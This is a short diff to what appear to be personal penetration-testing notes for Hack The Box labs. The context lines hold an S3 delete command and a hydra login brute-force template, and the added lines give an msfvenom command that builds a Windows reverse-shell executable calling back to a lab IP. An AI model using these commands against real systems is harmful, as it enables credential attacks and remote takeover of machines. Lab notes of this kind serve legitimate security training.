@@ -117,3 +117,17 @@ aws s3 rm --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://theto
 ```
 hydra -l [username] -P [path_to_passwd_list] -t 10 http-post-form [domain] "/URI:username=^USER^&password=^PASSWORD^:Cookie="
 ```
+
+# c2
+
+## metasploit
+
+### generate payloads
+
+- staged vs. not: shell/reverse_tcp vs. shell_reverse
+
+#### windows
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.189 LPORT=42069 -f exe -a x64 -o ./rev_shell.exe
+```
